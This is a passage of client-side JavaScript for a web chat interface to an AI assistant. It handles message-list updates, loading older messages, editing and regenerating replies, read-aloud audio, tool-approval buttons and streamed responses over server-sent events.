    for (const n of [...list.childNodes]) if (n.nodeType !== 1 || n.classList.contains("summary-divider")) n.remove();
    const old = new Map();
    for (const o of [...list.children]) {
      const key = o.id || o._src;
      if (key === undefined || old.has(key)) o.remove(); else old.set(key, o);
    }
    const put = [];
    let prev = null;
    for (const f of [...fresh.children]) {
      const src = f.outerHTML, key = f.id || src;
      const o = old.get(key);
      old.delete(key);
      let row = o;
      if (!o || o._src !== src) {
        row = f;
        f._src = src;
        if (o) { f.classList.add("no-rise"); keepDrawn(o, f); }
        put.push(f);
      }
      const here = prev ? prev.nextElementSibling : list.firstElementChild;
      if (row !== here) list.insertBefore(row, here);
      if (o && o !== row) o.remove();
      prev = row;
    }
    for (const o of old.values()) o.remove();
    for (const a of [...fresh.attributes]) list.setAttribute(a.name, a.value);
    return put;
  }
  // An answer that changed (it grew, or it is finished now) keeps the text
  // already drawn; only the difference is drawn. While it is still being
  // written, the words that came over the live connection are ahead of the
  // server's saved copy, so those are used.
  function keepDrawn(o, f) {
    const st = f.dataset.status === "streaming" ? live.get(Number(f.id.slice(1))) : null;
    for (const [sel, k] of [[".msg-main > .md", "c"], [".thinking-md", "r"]]) {
      const was = $(sel, o), now = $(sel, f);
      if (!was || !now || !was._parts) continue;
      const raw = (st && st[k]) || now.textContent;
      now.replaceWith(was);
      renderMD(was, raw);
    }
  }

  // ---------- load earlier messages ----------
  async function loadEarlier(btn) {
    btn.disabled = true;
    const before = oldestLoaded();
    try {
      const r = await fetch(`/t/${threadID}/messages?before=${before}`);
      if (!r.ok) { flash("Could not load earlier messages."); return; }
      const tmp = document.createElement("div");
      tmp.innerHTML = await r.text();
      const page = tmp.firstElementChild;
      const list = $("#messages");
      const prevHeight = scroller.scrollHeight;
      for (const row of page.children) row._src = row.outerHTML;
      renderAll(page);
      const nodes = [...page.children];
      btn.after(...nodes);
      list.dataset.oldest = page.dataset.oldest;
      list.dataset.hasOlder = page.dataset.hasOlder;
      historyFrom = Number(page.dataset.oldest);
      if (page.dataset.hasOlder !== "true") btn.remove();
      markSummarised(list);
      scroller.scrollTop += scroller.scrollHeight - prevHeight; // keep the view still
    } finally { btn.disabled = false; }
  }

  // ---------- composer state ----------
  const stopBtn = $("#stop");
  const queueInfo = $("#queue-info");
  function updateState(pendingOverride) {
    const list = $("#messages");
    if (!list) return;
    const pending = pendingOverride ?? Number(list.dataset.pending || 0);
    const running = list.dataset.running === "true";
    const waiting = list.dataset.waiting === "true";
    if (stopBtn) stopBtn.hidden = !running;
    if (queueInfo) queueInfo.textContent = waiting ? "Waiting for a free slot…" : pending > 0 ? `${pending} in queue` : "";
  }
  updateState();
  updateContext($("#messages"));
  markSummarised($("#messages"));

  const form = $("#composer");
  if (form) {
    const composer = setupComposer(form, {
      async onSubmit({ text, files, clear }) {
        let r;
        try {
          if (files.length) {
            const fd = new FormData();
            fd.append("content", text);
            files.forEach((f) => fd.append("files", f, f.name));
            r = await post(`/t/${threadID}/messages`, fd);
          } else {
            r = await post(`/t/${threadID}/messages`, { content: text });
          }
        } catch { flash("Network error. The message was not sent."); return; }
        if (r.ok) { clear(); jump = Date.now() + 1500; followAll = false; toBottom(true); } else flash(await errorText(r));
      },
    });
    if (!isTouch) composer.ta.focus();
  }
  stopBtn?.addEventListener("click", () => post(`/t/${threadID}/stop`));

  // ---------- edit / regenerate / cancel / approve ----------
  function openEdit(msg) {
    for (const m of $$(".msg.is-editing")) closeEdit(m);
    const box = $(".edit-box", msg);
    if (!box) return;
    msg.classList.add("is-editing");
    box.hidden = false;
    const ta = $("textarea", box);
    ta.value = bubbleText($(".bubble", msg));
    autosize(ta, 0.5);
    ta.focus();
    ta.setSelectionRange(ta.value.length, ta.value.length);
  }
  function closeEdit(msg) {
    msg.classList.remove("is-editing");
    const box = $(".edit-box", msg);
    if (box) box.hidden = true;
    if (deferred && !editing()) { deferred = false; refresh(); }
  }

  chat.addEventListener("click", async (e) => {
    const t = e.target;
    const open = t.closest("[data-edit-open]");
    if (open) openEdit(open.closest(".msg"));
    const cancelEdit = t.closest("[data-edit-cancel]");
    if (cancelEdit) closeEdit(cancelEdit.closest(".msg"));

    // Read aloud: the recording is made on the first click and kept on the
    // answer. One player sits above the message box, outside the message list,
    // so it keeps playing while the list is drawn again.
    const speak = t.closest("[data-speak]");
    if (speak && reader) {
      const audio = $("audio", reader);
      const play = (url) => {
        reader.hidden = false;
        if (!audio.src.endsWith(url)) audio.src = url;
        audio.play().catch(() => {}); // the browser may want one more click; the controls are right there
      };
      if (speak.dataset.audio) play(speak.dataset.audio);
      else if (!speak.disabled) {
        speak.disabled = true; speak.classList.add("is-busy");
        flash("Making the recording…");
        try {
          const r = await post(speak.dataset.speak, {});
          if (r.ok) { const url = (await r.json()).url; speak.dataset.audio = url; flash(""); play(url); }
          else flash(await errorText(r));
        } catch { flash("Network error. Please try again."); }
        finally { speak.disabled = false; speak.classList.remove("is-busy"); }
      }
    }
    if (t.closest("[data-reader-close]") && reader) { $("audio", reader).pause(); reader.hidden = true; }

    const regen = t.closest("[data-regen]");
    if (regen) {
      regen.disabled = true;
      const r = await post(regen.dataset.regen, { regenerate: "1" });
      if (!r.ok) { flash(await errorText(r)); regen.disabled = false; }
    }
    const cancel = t.closest("[data-cancel]");
    if (cancel) {
      const r = await post(cancel.dataset.cancel);
      if (!r.ok) flash(await errorText(r));
    }
    const approve = t.closest("[data-approve]");
    if (approve) {
      const card = approve.closest(".approval");
      for (const b of $$("button", card)) b.disabled = true;
      const r = await post(approve.dataset.approve, { decision: approve.dataset.decision });
      if (!r.ok) { flash(await errorText(r)); for (const b of $$("button", card)) b.disabled = false; }
      else if (approve.dataset.decision === "always") flash("This server now runs tools automatically. Change it in Settings → MCP servers.");
    }
    const earlier = t.closest("[data-load-earlier]");
    if (earlier) loadEarlier(earlier);
  });
  chat.addEventListener("input", (e) => { if (e.target.matches(".edit-box textarea")) autosize(e.target, 0.5); });
  chat.addEventListener("keydown", (e) => {
    const ta = e.target.closest?.(".edit-box textarea");
    if (!ta) return;
    if (e.key === "Escape") { e.stopPropagation(); closeEdit(ta.closest(".msg")); }
    if (e.key === "Enter" && !e.shiftKey && !e.isComposing && !isTouch) { e.preventDefault(); ta.form.requestSubmit(); }
  });
  chat.addEventListener("submit", async (e) => {
    const box = e.target.closest(".edit-box");
    if (!box) return;
    e.preventDefault();
    const msg = box.closest(".msg");
    const btn = $("button[type=submit]", box);
    btn.disabled = true;
    try {
      const r = await post(box.dataset.edit, { content: $("textarea", box).value.trim() });
      if (r.ok) { closeEdit(msg); jump = Date.now() + 1500; followAll = false; toBottom(true); } else flash(await errorText(r));
    } catch { flash("Network error. Please try again."); }
    finally { btn.disabled = false; }
  });

  // ---------- server-sent events ----------
  const reader = $("#reader");
  let lastResync = 0;
  // Every new connection starts with a snapshot of the answer being written,
  // and the list is read again: nothing that happened in between is missed.
  const stream = liveStream(`/t/${threadID}/events`, (e) => {
    let ev;
    try { ev = JSON.parse(e.data); } catch { return; }
    switch (ev.type) {
      case "token": onToken(ev.data); break;
      case "snapshot": onSnapshot(ev.data); break;
      case "queue": updateState(ev.data.pending); break;
      case "approval": refresh(); if (document.visibilityState !== "visible") document.title = "● Approval needed · " + document.title.replace(/^● Approval needed · /, ""); break;
      case "messages": case "run": case "compacted": refresh(); break;
    }
  }, () => refresh());
  function resync() { // reconnecting yields a fresh snapshot
    const now = Date.now();
    if (now - lastResync < 2000) return;
    lastResync = now;
    stream.reopen();
  }
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible") document.title = document.title.replace(/^● Approval needed · /, "");
  });
})();
